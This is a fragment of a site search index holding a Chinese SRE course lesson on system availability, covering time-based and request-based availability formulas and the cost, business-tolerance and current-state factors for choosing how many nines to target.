<p>\u6211\u60f3\u65e0\u8bba\u4f60\u662f\u56e2\u961f\u8d1f\u8d23\u4eba\u3001\u67b6\u6784\u5e08\uff0c\u8fd8\u662f\u4e00\u7ebf\u7684\u6280\u672f\u4e13\u5bb6\uff0c\u6709\u4e86\u8fd9\u6837\u7684\u5168\u5c40\u89c6\u89d2\u540e\uff0c\u5c31\u4f1a\u77e5\u9053\u63a5\u4e0b\u6765\u5e94\u8be5\u4ece\u4f55\u5165\u624b\uff0c\u4ee5\u53ca\u5982\u4f55\u4e0e\u5176\u4ed6\u56e2\u961f\u534f\u4f5c\u6765\u6784\u5efa\u8fd9\u6837\u7684\u4f53\u7cfb\u3002</p>"},{"location":"ops/50-sre-mogu-02/","title":"02 | \u7cfb\u7edf\u53ef\u7528\u6027\uff1a\u6ca1\u6709\u6545\u969c\uff0c\u7cfb\u7edf\u5c31\u4e00\u5b9a\u662f\u7a33\u5b9a\u7684\u5417\uff1f","text":"<p>\u6211\u4eec\u5148\u6765\u590d\u4e60\u4e00\u4e0b\u4e0a\u4e00\u8bb2\u7684\u5185\u5bb9\uff0c\u603b\u7ed3\u4e0b\u6765\u5c31\u662f\uff0cSRE\u662f\u4e2a\u4f53\u7cfb\u5316\u5de5\u7a0b\uff0c\u6211\u4eec\u901a\u8fc7\u6784\u5efaSRE\u8fd9\u6837\u4e00\u5957\u4f53\u7cfb\u6765\u4fdd\u8bc1\u7cfb\u7edf\u7a33\u5b9a\u6027\uff0c\u5177\u4f53\u6765\u8bf4\u5c31\u662f\u201c\u63d0\u5347MTBF\uff0c\u964d\u4f4eMTTR\u201d\u3002\u6709\u4e86\u8fd9\u6837\u4e00\u4e2a\u6fc0\u52a8\u4eba\u5fc3\u7684\u76ee\u6807\uff0c\u4f60\u662f\u4e0d\u662f\u60f3\u7740\u90a3\u54b1\u8fd8\u7b49\u4ec0\u4e48\uff0c\u8d76\u5feb\u3001\u7acb\u9a6c\u5c31\u5165\u624b\u5efa\u8bbeSRE\u4f53\u7cfb\u5427\uff01</p> <p>\u55ef\uff0c\u597d\u60f3\u6cd5\uff0c\u6211\u4e5f\u5f88\u60f3\u54b1\u5c31\u76f4\u63a5\u201c\u64b8\u8d77\u8896\u5b50\u52a0\u6cb9\u5e72\u201d\u3002\u4e0d\u8fc7\u4eca\u5929\u6211\u4eec\u8981\u5148\u7f13\u4e00\u7f13\uff0c\u5728\u6b63\u5f0f\u8fdb\u5165SRE\u843d\u5730\u7ec6\u8282\u4e4b\u524d\uff0c\u6211\u4eec\u5f97\u5148\u8ba8\u8bba\u4e00\u4e0b\u76ee\u524d\u4e1a\u754c\u5e38\u7528\u7684\u201c\u7cfb\u7edf\u53ef\u7528\u6027\uff08Availability\uff09\u201d\u8fd9\u4e2a\u6982\u5ff5\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u5e38\u542c\u5230\u7684\u201c3\u4e2a9\u201d\uff0899.9%\u621699.95%\uff09\u3001\u201c4\u4e2a9\u201d\uff0899.99%\u621699.995%\uff09\u3002</p> <p>\u4e3a\u4ec0\u4e48\u8981\u5148\u6765\u8ba8\u8bba\u201c\u7cfb\u7edf\u53ef\u7528\u6027\u201d\u8fd9\u4e2a\u5927\u5bb6\u5df2\u7ecf\u5f88\u719f\u6089\u7684\u6982\u5ff5\u5462\uff1f</p> <p>\u4e00\u65b9\u9762\uff0c\u7cfb\u7edf\u53ef\u7528\u6027\u548c\u6211\u4eec\u5efa\u8bbeSRE\u7684\u76ee\u6807\u5f3a\u76f8\u5173\uff0cSRE\u7684\u7a33\u5b9a\u6027\u76ee\u6807\u5176\u5b9e\u5c31\u662f\u5c3d\u91cf\u51cf\u5c11\u7cfb\u7edf\u6545\u969c\u6216\u5f02\u5e38\u8fd0\u884c\u72b6\u6001\u7684\u53d1\u751f\uff0c\u63d0\u5347\u7cfb\u7edf\u53ef\u7528\u7684\u8fd0\u884c\u65f6\u95f4\u5360\u6bd4\u3002\u5f88\u660e\u663e\uff0c\u8fd9\u4e2a\u53ef\u7528\u65f6\u957f\u5c31\u975e\u5e38\u5173\u952e\u4e86\u3002</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u7cfb\u7edf\u53ef\u7528\u6027\u8fd9\u4e2a\u6982\u5ff5\u770b\u4f3c\u7b80\u5355\uff0c\u4f46\u6211\u53d1\u73b0\u771f\u7684\u6df1\u5165\u8fdb\u53bb\uff0c\u5927\u5bb6\u7684\u7406\u89e3\u5176\u5b9e\u6709\u5f88\u591a\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u6bd4\u5982\u5230\u5e95\u600e\u6837\u624d\u7b97\u662f\u53ef\u7528\u65f6\u957f\uff0c\u600e\u6837\u7b97\u662f\u4e0d\u53ef\u7528\u65f6\u957f\u5462\uff1f\u8fd9\u4e2a\u6807\u51c6\u662f\u600e\u4e48\u5b9a\u4e49\u7684\uff1f\u9664\u4e86\u4ece\u65f6\u95f4\u7ef4\u5ea6\u6765\u8861\u91cf\u53ef\u7528\u6027\uff0c\u8fd8\u6709\u5176\u5b83\u7684\u8861\u91cf\u65b9\u5f0f\u5417\uff1f\u201c3\u4e2a9\u201d\u3001\u201c4\u4e2a9\u201d\u542c\u8d77\u6765\u90fd\u5f88\u597d\uff0c\u90a3\u5177\u4f53\u6765\u8bf4\u6211\u4eec\u7684\u7cfb\u7edf\u8981\u8fbe\u5230\u201c\u51e0\u4e2a9\u201d\u624d\u7b97\u662f\u7a33\u5b9a\u7684\u5462\uff1f</p> <p>\u6240\u4ee5\uff0c\u4eca\u5929\u6211\u4eec\u5148\u6162\u4e0b\u6765\uff0c\u82b1\u65f6\u95f4\u628a\u4e0a\u9762\u8fd9\u4e9b\u95ee\u9898\u90fd\u5f7b\u5e95\u641e\u6e05\u695a\uff0c\u8fbe\u6210\u5171\u8bc6\uff0c\u6253\u597d\u57fa\u7840\uff0c\u54b1\u540e\u9762\u7684SRE\u5b66\u4e60\u624d\u80fd\u4e8b\u534a\u529f\u500d\u3002</p>"},{"location":"ops/50-sre-mogu-02/#2","title":"\u8861\u91cf\u7cfb\u7edf\u53ef\u7528\u6027\u76842\u79cd\u65b9\u5f0f","text":"<p>\u90a3\u6211\u5c31\u76f4\u63a5\u7ed9\u7b54\u6848\u4e86\uff0c\u76ee\u524d\u4e1a\u754c\u6709\u4e24\u79cd\u8861\u91cf\u7cfb\u7edf\u53ef\u7528\u6027\u7684\u65b9\u5f0f\uff0c\u4e00\u4e2a\u662f\u65f6\u95f4\u7ef4\u5ea6\uff0c\u4e00\u4e2a\u662f\u8bf7\u6c42\u7ef4\u5ea6\uff0c\u6211\u4eec\u5148\u6765\u770b\u8fd9\u4e24\u4e2a\u7ef4\u5ea6\u7684\u8ba1\u7b97\u516c\u5f0f\u3002</p> <p>\u65f6\u95f4\u7ef4\u5ea6\uff1aAvailability = Uptime / (Uptime + Downtime)</p> <p>\u8bf7\u6c42\u7ef4\u5ea6\uff1aAvailability = Successful request / Total request</p> <p>\u8fd9\u4e24\u4e2a\u516c\u5f0f\u5f88\u7b80\u5355\uff0c\u6211\u4eec\u5f97\u6df1\u5165\u8fdb\u53bb\uff0c\u4e00\u4e00\u6765\u770b\u3002</p> <p>\u6211\u4eec\u5148\u6765\u770b\u65f6\u95f4\u7ef4\u5ea6\u7684\u7cfb\u7edf\u53ef\u7528\u6027\u3002\u7528\u4e00\u53e5\u8bdd\u6765\u6982\u62ec\uff1a\u65f6\u957f\u7ef4\u5ea6\uff0c\u662f\u4ece\u6545\u969c\u89d2\u5ea6\u51fa\u53d1\u5bf9\u7cfb\u7edf\u7a33\u5b9a\u6027\u8fdb\u884c\u8bc4\u4f30\u3002</p> <p>\u8fd9\u7c7b\u8ba1\u7b97\u65b9\u5f0f\u6211\u4eec\u6700\u5e38\u89c1\uff0c\u6bd5\u7adf\u4f60\u7684\u7cfb\u7edf\u5728\u4e00\u6bb5\u65f6\u95f4\u91cc\u4e0d\u51fa\u73b0\u6545\u969c\uff0c\u5c31\u8bf4\u660e\u5b83\u5f88\u7a33\u5b9a\u561b\uff01\u4e0d\u8fc7\uff0c\u5728\u771f\u5b9e\u7684\u4f7f\u7528\u573a\u666f\u4e2d\uff0c\u600e\u4e48\u6837\u624d\u7b97\u662f\u53ef\u7528\u65f6\u957f\uff0c\u4ec0\u4e48\u60c5\u51b5\u4e0b\u53c8\u662f\u4e0d\u53ef\u7528\u65f6\u957f\uff0c\u8fd9\u4e2a\u662f\u600e\u4e48\u5b9a\u4e49\u7684\u5462\uff1f</p> <p>\u7ec6\u60f3\u4e00\u4e0b\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f60\u4f1a\u53d1\u73b0\u8fd8\u771f\u6709\u70b9\u590d\u6742\uff0c\u90a3\u6211\u5c31\u4e3e\u4e2a\u53d1\u70e7\u751f\u75c5\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u4e00\u4e0b\u3002</p> <p>\u6211\u4eec\u77e5\u9053\uff0c\u4e00\u4e2a\u4eba\u5982\u679c\u53d1\u70e7\u4e86\uff0c\u4f53\u6e29\u4e00\u822c\u4f1a\u8d85\u8fc737.5\u5ea6\uff0c\u90a3\u5982\u679c\u8fd9\u4e2a\u4eba\u7684\u4f53\u6e29\u6b63\u597d\u8fbe\u5230\u8fd9\u4e2a\u6e29\u5ea6\uff0c\u662f\u4e0d\u662f\u4ee3\u8868\u4ed6\u4e00\u5b9a\u662f\u751f\u75c5\u4e86\u5462\uff1f\u4f9d\u636e\u751f\u6d3b\u7ecf\u9a8c\uff0c\u6211\u4eec\u77e5\u9053\u4e0d\u4e00\u5b9a\u3002\u4e3a\u4ec0\u4e48\u5462\uff1f\u56e0\u4e3a\u6211\u4eec\u5224\u65ad\u4e00\u4e2a\u4eba\u662f\u5426\u53d1\u70e7\u751f\u75c5\uff0c\u4e0d\u662f\u53ea\u770b\u8fd9\u4e00\u6b21\u3001\u4e00\u65f6\u7684\u4f53\u6e29\uff0c\u8fd8\u8981\u770b\u4ed6\u4f53\u6e29\u662f\u4e0d\u662f\u6301\u7eed\u8d85\u8fc737.5\u5ea6\u3002</p> <p>\u6240\u4ee5\uff0c\u8fd9\u91cc\u5c31\u6d89\u53ca\u5230\u4e00\u4e2a\u6d4b\u91cf\u65b9\u6cd5\u548c\u5224\u5b9a\u65b9\u6cd5\u7684\u95ee\u9898\uff0c\u5305\u542b\u4e09\u4e2a\u8981\u7d20\uff1a</p> <ul> <li>\u4e00\u4e2a\u662f**\u8861\u91cf\u6307\u6807**\uff0c\u6bd4\u5982\u4f53\u6e29\u5c31\u662f\u8861\u91cf\u6307\u6807\uff1b</li> <li>\u7b2c\u4e8c\u4e2a\u662f**\u8861\u91cf\u76ee\u6807**\uff0c\u8fbe\u5230\u4ec0\u4e48\u76ee\u6807\u662f\u6b63\u5e38\uff0c\u8fbe\u4e0d\u5230\u5c31\u662f\u5f02\u5e38\uff0c\u4f4e\u4e8e37.5\u5ea6\u7b97\u6b63\u5e38\uff0c\u8d85\u8fc737.5\u5ea6\u5c31\u662f\u5f02\u5e38\uff0c\u4f46\u662f\u5355\u6b21\u6d4b\u91cf\u4e0d\u80fd\u8bf4\u660e\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u591a\u6b21\u6d4b\u91cf\uff0c\u6bd4\u59826\u6b21\u4e2d\u6709\u81f3\u5c114\u6b21\u4f4e\u4e8e37.5\u5ea6\u624d\u7b97\u6b63\u5e38\uff0c\u8f6c\u5316\u6210\u6bd4\u4f8b\u7684\u8bdd\u5c31\u662f67%\uff1b</li> <li>\u7b2c\u4e09\u4e2a\u662f**\u5f71\u54cd\u65f6\u957f**\uff0c\u6bd4\u5982\u6301\u7eed\u8d85\u8fc712\u5c0f\u65f6\u3002</li> </ul> <p>\u5bf9\u5e94\u5230\u7cfb\u7edf\u4e0a\uff0c\u6211\u4eec\u4e5f\u4f1a\u7528\u4e00\u7cfb\u5217\u7684\u6807\u51c6\u548c\u5224\u5b9a\u903b\u8f91\u6765\u8bf4\u660e\u7cfb\u7edf\u662f\u5426\u6b63\u5e38\u3002\u6bd4\u5982\uff0c\u7cfb\u7edf\u8bf7\u6c42\u72b6\u6001\u7801\u4e3a\u975e5xx\u7684\u6bd4\u4f8b\uff0c\u4e5f\u5c31\u662f\u8bf7\u6c42\u6210\u529f\u7387\u4f4e\u4e8e95%\uff0c\u5df2\u7ecf\u8fde\u7eed\u8d85\u8fc710\u5206\u949f\uff0c\u8fd9\u65f6\u5c31\u8981\u7b97\u4f5c\u6545\u969c\uff0c\u90a3\u4e4810\u5206\u949f\u5c31\u8981\u7eb3\u5165Downtime\uff08\u5b95\u673a\u65f6\u95f4\uff09\uff0c\u5982\u679c\u8fbe\u4e0d\u5230\u8fd9\u4e2a\u6807\u51c6\uff0c\u5c31\u4e0d\u7b97\u4f5c\u6545\u969c\uff0c\u53ea\u662f\u7b97\u4f5c\u4e00\u822c\u6216\u5076\u7136\u7684\u5f02\u5e38\u95ee\u9898\u3002</p> <p>\u8fd9\u91cc\u540c\u6837\u6709\u4e09\u4e2a\u8981\u7d20\uff1a</p> <ul> <li>\u8861\u91cf\u6307\u6807\uff0c\u7cfb\u7edf\u8bf7\u6c42\u72b6\u6001\u7801\uff1b</li> <li>\u8861\u91cf\u76ee\u6807\uff0c\u975e5xx\u5360\u6bd4\uff0c\u4e5f\u5c31\u662f\u6210\u529f\u7387\u8fbe\u523095%\uff1b</li> <li>\u5f71\u54cd\u65f6\u957f\uff0c\u6301\u7eed10\u5206\u949f\u3002</li> </ul> <p>\u56e0\u6b64\uff0c\u53ea\u6709\u5f53\u95ee\u9898\u8fbe\u5230\u4e00\u5b9a\u5f71\u54cd\u7a0b\u5ea6\u624d\u4f1a\u7b97\u4f5c\u6545\u969c\uff0c\u8fd9\u65f6\u624d\u4f1a\u8ba1\u7b97\u4e0d\u53ef\u7528\u65f6\u957f\uff0c\u4e5f\u5c31\u662f\u4e0a\u9762\u516c\u5f0f\u4e2d\u7684Downtime\u3002\u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u8981\u6c42\u4e00\u4e2a\u5468\u671f\u5185\uff0c\u5141\u8bb8\u7684Downtime\uff0c\u6216\u8005\u8bf4\u662f\u7cfb\u7edf\u7684\u201c\u751f\u75c5\u65f6\u95f4\u201d\u662f\u6709\u9650\u7684\uff0c\u7528\u8fd9\u4e2a\u6709\u9650\u65f6\u95f4\u6765\u7ea6\u675f\u7cfb\u7edf\u7a33\u5b9a\u6027\u3002</p> <p>\u4e0b\u9762\u662f\u6211\u4eec\u5e38\u89c1\u7684\u6309\u65f6\u957f\u7ef4\u5ea6\u7edf\u8ba1\u7684\u53ef\u7528\u6027\u5bf9\u7167\u8868\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u524d\u9762\u63d0\u5230\u7684\u51e0\u4e2a9\uff1a</p> <p></p> <p>\u8bb2\u5230\u8fd9\u91cc\uff0c\u9488\u5bf9\u65f6\u957f\u7ef4\u5ea6\u7684\u7a33\u5b9a\u6027\u8ba1\u7b97\u65b9\u5f0f\u5c31\u6bd4\u8f83\u6e05\u695a\u4e86\uff0c\u4f46\u662f\u4ece\u8fd9\u79cd\u8ba1\u7b97\u65b9\u5f0f\u4e2d\uff0c\u4f60\u6709\u6ca1\u6709\u770b\u51fa\u4e00\u4e9b\u95ee\u9898\u5462\uff1f</p> <p>\u6211\u60f3\u4f60\u80af\u5b9a\u770b\u51fa\u6765\u4e86\uff0c\u8fd9\u91cc\u6700\u663e\u8457\u7684\u95ee\u9898\u5c31\u662f\uff0c\u7a33\u5b9a\u6027\u53ea\u4e0e\u6545\u969c\u53d1\u751f\u6302\u94a9\u3002</p> <p>\u6211\u4eec\u6765\u60f3\u4e00\u60f3\uff0c\u8fd9\u6837\u505a\u4f1a\u5e26\u6765\u54ea\u4e9b\u95ee\u9898\uff1f\u6bd4\u5982\u6709\u4e00\u4e2a\u7cfb\u7edf\uff0c\u56e0\u4e3a\u7f51\u7edc\u6296\u52a8\uff0c\u6709\u77ed\u6682\u7684\u51e0\u79d2\u3001\u5341\u51e0\u79d2\uff0c\u6216\u8005\u51e0\u5206\u949f\u5f02\u5e38\uff0c\u4f46\u662f\u540e\u6765\u7cfb\u7edf\u81ea\u5df1\u6062\u590d\u4e86\uff0c\u4e1a\u52a1\u5e76\u6ca1\u6709\u4e2d\u65ad\uff0c\u8fd9\u65f6\u6211\u4eec\u6309\u7167\u65f6\u957f\u7ef4\u5ea6\u6765\u5224\u65ad\uff0c\u8fd9\u80af\u5b9a\u4e0d\u4f1a\u7b97\u4f5c\u7cfb\u7edf\u6545\u969c\u3002\u4f46\u662f\u5982\u679c\u8fd9\u79cd\u77ed\u6682\u7684\u5f71\u54cd\u9891\u5ea6\u975e\u5e38\u9ad8\uff0c\u4e00\u5929\u6765\u4e2a5\u30016\u6b21\uff0c\u6301\u7eed\u4e00\u4e24\u5468\uff0c\u6211\u4eec\u5e94\u8be5\u53ef\u4ee5\u5224\u5b9a\u7cfb\u7edf\u8fd0\u884c\u72b6\u51b5\u4e5f\u662f\u4e0d\u6b63\u5e38\u7684\uff0c\u53ef\u80fd\u4e0d\u662f\u6545\u969c\uff0c\u4f46\u80af\u5b9a\u662f\u4e0d\u7a33\u5b9a\u4e86\u3002</p> <p>\u6240\u4ee5\u8fd9\u79cd\u7528\u65f6\u957f\u7ef4\u5ea6\u6765\u8861\u91cf\u7cfb\u7edf\u7a33\u5b9a\u6027\u7684\u65b9\u5f0f\uff0c\u5176\u4e3b\u8981\u7f3a\u70b9\u5c31\u662f\u7c92\u5ea6\u4e0d\u591f\u7cbe\u7ec6\u3002\u8fd9\u4e9b\u5c0f\u7684\u5f02\u5e38\u95ee\u9898\u548c\u5b83\u4eec\u7684\u5f71\u54cd\uff0c\u5982\u679c\u4ece\u66f4\u957f\u7684\u5468\u671f\u6765\u770b\uff0c\u4e5f\u662f\u6709\u4e00\u5b9a\u53c2\u8003\u4ef7\u503c\u7684\u3002\u90a3\u600e\u6837\u624d\u80fd\u8861\u91cf\u5f97\u66f4\u7cbe\u7ec6\u4e9b\u5462\uff1f</p> <p>\u8fd9\u5c31\u9700\u8981\u7b2c\u4e8c\u79cd\u8861\u91cf\u65b9\u5f0f\u4e86\uff0c\u4e5f\u5c31\u662f\u4ece\u8bf7\u6c42\u7ef4\u5ea6\u6765\u8861\u91cf\u7cfb\u7edf\u53ef\u7528\u6027\u3002</p> <p>\u7528\u4e00\u53e5\u8bdd\u6765\u8bf4\uff0c\u8bf7\u6c42\u7ef4\u5ea6\uff0c\u662f\u4ece\u6210\u529f\u8bf7\u6c42\u5360\u6bd4\u7684\u89d2\u5ea6\u51fa\u53d1\uff0c\u5bf9\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u8fdb\u884c\u8bc4\u4f30\u3002</p> <p>\u5047\u5b9a\u6211\u4eec\u7684\u7cfb\u7edf\u4e00\u5929\u5185\u6709100,000\u6b21\u8bf7\u6c42\uff0c\u6211\u4eec\u671f\u671b\u7684\u6210\u529f\u7387\u81f3\u5c11\u662f95%\uff0c\u5982\u679c\u67095001\u6b21\u8bf7\u6c42\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u6210\u529f\u7387\u4f4e\u4e8e95%\u4e86\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u7cfb\u7edf\u8fd0\u884c\u72b6\u6001\u662f\u4e0d\u6b63\u5e38\u7684\u3002</p> <p>\u8bf7\u6c42\u7ef4\u5ea6\u7684\u7cfb\u7edf\u53ef\u7528\u6027\u540c\u6837\u5305\u542b\u4e09\u4e2a\u5173\u952e\u8981\u7d20\uff0c\u7b2c\u4e00\u4e2a\u8861\u91cf\u6307\u6807\uff0c\u8bf7\u6c42\u6210\u529f\u7387\uff1b\u7b2c\u4e8c\u4e2a\u8861\u91cf\u76ee\u6807\uff0c\u6210\u529f\u7387\u8fbe\u523095%\u624d\u7b97\u7cfb\u7edf\u8fd0\u884c\u6b63\u5e38\uff1b\u7b2c\u4e09\u4e2a\u662f\u7edf\u8ba1\u5468\u671f\uff0c\u6bd4\u5982\u4e00\u5929\u3001\u4e00\u5468\u3001\u4e00\u4e2a\u6708\u7b49\u7b49\uff0c\u6211\u4eec\u662f\u5728\u4e00\u4e2a\u7edf\u8ba1\u5468\u671f\u5185\u8ba1\u7b97\u6574\u4f53\u72b6\u51b5\uff0c\u800c\u4e0d\u662f\u770b\u5355\u6b21\u7684\u3002</p> <p>\u4f60\u770b\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5bf9\u7cfb\u7edf\u8fd0\u884c\u72b6\u51b5\u662f\u5426\u7a33\u5b9a\u76d1\u7ba1\u5f97\u66f4\u4e3a\u4e25\u683c\uff0c\u4e0d\u4f1a\u6f0f\u6389\u4efb\u4f55\u4e00\u6b21\u95ee\u9898\u7684\u5f71\u54cd\uff0c\u56e0\u4e3a\u5b83\u5bf9\u7cfb\u7edf\u6574\u4f53\u8fd0\u884c\u7684\u7a33\u5b9a\u6027\u5224\u5b9a\uff0c\u4e0d\u4ec5\u4ec5\u4f1a\u901a\u8fc7\u5355\u6b21\u7684\u5f02\u5e38\u5f71\u54cd\u8fdb\u884c\u8bc4\u4f30\uff0c\u8fd8\u4f1a\u7d2f\u8ba1\u53e0\u52a0\u8fdb\u884c\u5468\u671f\u6027\u7684\u8bc4\u4f30\u3002</p> <p>\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u5c31\u603b\u7ed3\u51fa\u4e00\u6761\u81f3\u5173\u91cd\u8981\u7684\u7ecf\u9a8c\u4e86\uff1a\u6545\u969c\u4e00\u5b9a\u610f\u5473\u7740\u4e0d\u7a33\u5b9a\uff0c\u4f46\u662f\u4e0d\u7a33\u5b9a\uff0c\u5e76\u4e0d\u610f\u5473\u7740\u4e00\u5b9a\u6709\u6545\u969c\u53d1\u751f\u3002</p> <p>\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u638c\u63e1\u4e86\u8861\u91cf\u7cfb\u7edf\u53ef\u7528\u6027\u7684\u4e24\u4e2a\u7ef4\u5ea6\u3001\u4e24\u79cd\u7b97\u6cd5\uff0c\u5b83\u4eec\u90fd\u5305\u542b\u4e09\u4e2a\u5173\u952e\u8981\u7d20\uff1a\u8861\u91cf\u6307\u6807\u3001\u8861\u91cf\u76ee\u6807\u3001\u5f71\u54cd\u65f6\u957f/\u7edf\u8ba1\u5468\u671f\u3002\u8fd9\u4e24\u79cd\u7b97\u6cd5\u6700\u540e\u90fd\u4f1a\u843d\u811a\u5230\u201c\u51e0\u4e2a9\u201d\u4e0a\uff0c\u90a3\u7cfb\u7edf\u5230\u5e95\u5b9a\u201c\u51e0\u4e2a9\u201d\u624d\u7b97\u662f\u7a33\u5b9a\u7684\u5462\uff1f\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c31\u6765\u56de\u7b54\u8fd9\u4e2a\u95ee\u9898\u3002</p>"},{"location":"ops/50-sre-mogu-02/#3","title":"\u8bbe\u5b9a\u7cfb\u7edf\u7a33\u5b9a\u6027\u76ee\u6807\u8981\u8003\u8651\u76843\u4e2a\u56e0\u7d20","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u5176\u5b9e\u5e76\u6ca1\u6709\u6807\u51c6\u7b54\u6848\uff0c\u4ece\u6211\u7684\u7ecf\u9a8c\u6765\u770b\uff0c\u5230\u5e95\u5b9a\u201c\u51e0\u4e2a9\u201d\u4e3b\u8981\u53d6\u51b3\u4e8e\u4ee5\u4e0b\u4e09\u4e2a\u56e0\u7d20\u3002</p> <p>\u7b2c\u4e00\u4e2a\uff0c\u6210\u672c\u56e0\u7d20\u3002</p> <p>\u4ece\u7406\u8bba\u4e0a\u6765\u8bf4\uff0c\u80af\u5b9a\u662f9\u8d8a\u591a\u7a33\u5b9a\u6027\u8d8a\u597d\uff0c\u4f46\u662f\u76f8\u5e94\u4ed8\u51fa\u7684\u6210\u672c\u548c\u4ee3\u4ef7\u4e5f\u4f1a\u66f4\u9ad8\u3002\u6bd4\u5982\u4e3a\u4e86\u66f4\u9ad8\u7684\u53ef\u7528\u6027\uff0c\u8981\u6709\u66f4\u591a\u7684\u5197\u4f59\u8d44\u6e90\u6295\u5165\uff0c\u751a\u81f3\u8981\u505a\u4e3b\u5907\u3001\u53cc\u6d3b\u751a\u81f3\u662f\u591a\u6d3b\u3002\u5982\u679c\u4e00\u5bb6\u516c\u53f8\u7684\u4e1a\u52a1\u91cf\u548c\u5f71\u54cd\u529b\u90fd\u53d1\u5c55\u5230\u4e00\u5b9a\u7a0b\u5ea6\uff0c\u90a3\u8fd9\u4e2a\u6210\u672c\u4e0d\u7ba1\u591a\u9ad8\u90fd\u662f\u5fc5\u987b\u8981\u4ed8\u51fa\u7684\u3002\u4f46\u662f\uff0c\u80af\u5b9a\u4e0d\u662f\u6240\u6709\u7684\u516c\u53f8\u90fd\u9700\u8981\u4ed8\u51fa\u8fd9\u4e48\u9ad8\u7684\u6210\u672c\uff0c\u800c\u662f\u8981\u5148\u8003\u8651ROI\uff08\u56de\u62a5\u7387\uff09\u3002\u8fd9\u65f6\u5019\u5c31\u8981\u770b\u4f01\u4e1a\u81ea\u8eab\u5bf9\u6210\u672c\u538b\u529b\u7684\u627f\u62c5\u60c5\u51b5\u4e86\u3002</p> <p>\u7b2c\u4e8c\u4e2a\uff0c\u4e1a\u52a1\u5bb9\u5fcd\u5ea6\u3002</p> <p>\u7a33\u5b9a\u6027\u600e\u4e48\u8bbe\u5b9a\uff0c\u5f88\u5927\u7a0b\u5ea6\u4e0a\u8fd8\u8981\u53d6\u51b3\u4e8e\u4e1a\u52a1\u4e0a\u7684\u5bb9\u5fcd\u5ea6\u3002\u5bf9\u4e8e\u6838\u5fc3\u4e1a\u52a1\u6216\u6838\u5fc3\u5e94\u7528\uff0c\u6bd4\u5982\u7535\u5546\u7684\u4ea4\u6613\u548c\u652f\u4ed8\u7cfb\u7edf\uff0c\u6211\u4eec\u5f53\u7136\u662f\u5e0c\u671b\u6210\u529f\u7387\u8d8a\u9ad8\u8d8a\u597d\uff0c\u4e00\u822c\u5bf9\u7cfb\u7edf\u7a33\u5b9a\u6027\u8981\u6c42\u662f\u201c3\u4e2a9\u201d\u6216\u201c4\u4e2a9\u201d\u3002\u56e0\u4e3a\u8fd9\u4e9b\u7cfb\u7edf\u4e00\u65e6\u51fa\u95ee\u9898\uff0c\u5c31\u4f1a\u76f4\u63a5\u5f71\u54cd\u6574\u4e2a\u7f51\u7ad9\u548c\u516c\u53f8\u7684\u6536\u76ca\uff0c\u8fd9\u4e9b\u90fd\u662f\u94b1\uff0c\u6240\u4ee5\u5bf9\u7a33\u5b9a\u6027\u8981\u6c42\u5fc5\u7136\u5c31\u4f1a\u63d0\u9ad8\u3002</p> <p>\u4f46\u662f\uff0c\u5bf9\u4e8e\u975e\u6838\u5fc3\u4e1a\u52a1\u6216\u5e94\u7528\uff0c\u6bd4\u5982\u5546\u54c1\u8bc4\u8bba\uff0c\u5546\u54c1\u8bc4\u5206\u7b49\uff0c\u6216\u8bb8\u201c2\u4e2a9\u201d\u4e5f\u80fd\u5bb9\u5fcd\u3002\u56e0\u4e3a\u77ed\u65f6\u95f4\u7684\u8bc4\u8bba\u770b\u4e0d\u5230\uff0c\u5e76\u4e0d\u4f1a\u5bf9\u4e1a\u52a1\u6536\u5165\u548c\u7528\u6237\u4f53\u9a8c\u9020\u6210\u592a\u5927\u7684\u5f71\u54cd\u3002</p> <p>\u7b2c\u4e09\u4e2a\uff0c\u7cfb\u7edf\u5f53\u524d\u7684\u7a33\u5b9a\u6027\u72b6\u51b5\u3002</p> <p>\u7ed3\u5408\u7cfb\u7edf\u7684\u5b9e\u9645\u60c5\u51b5\uff0c\u5b9a\u4e00\u4e2a\u5408\u7406\u7684\u6807\u51c6\u6bd4\u5b9a\u4e00\u4e2a\u66f4\u9ad8\u7684\u6807\u51c6\u4f1a\u66f4\u91cd\u8981\u3002\u8fd9\u4e2a\u5408\u7406\u7684\u503c\u5e94\u8be5\u600e\u4e48\u6765\u5b9a\u5462\uff1f</p> <p>\u6211\u4e2a\u4eba\u7684\u5efa\u8bae\u662f\u4ece\u7cfb\u7edf\u73b0\u72b6\u5165\u624b\uff0c\u6bd4\u5982\uff0c\u5982\u679c\u7cfb\u7edf\u53ef\u7528\u6027\u662f\u4f4e\u4e8e99%\u7684\uff0c\u90a3\u9996\u5148\u7b2c\u4e00\u6b65\u662f\u4e0d\u662f\u53ef\u4ee5\u505a\u523099%\uff0c\u7136\u540e\u518d\u4e89\u53d6\u505a\u523099.5%\uff0c\u518d\u523099.9%\uff0c\u4e00\u6b65\u4e00\u6b65\u671d\u7740\u66f4\u9ad8\u7684\u6807\u51c6\u8fc8\u8fdb\u3002\u540c\u65f6\uff0c\u8fd9\u6837\u505a\u4e5f\u4f1a\u66f4\u5bb9\u6613\u843d\u5730\uff0c\u56e0\u4e3a\u4f60\u5982\u679c\u5b9a\u4e00\u4e2a\u592a\u9ad8\u7684\u76ee\u6807\uff0c\u53c8\u59cb\u7ec8\u8fbe\u4e0d\u6210\uff0c\u53cd\u800c\u4f1a\u6253\u51fb\u5230\u56e2\u961f\u7684\u81ea\u4fe1\u5fc3\u548c\u79ef\u6781\u6027\u3002</p> 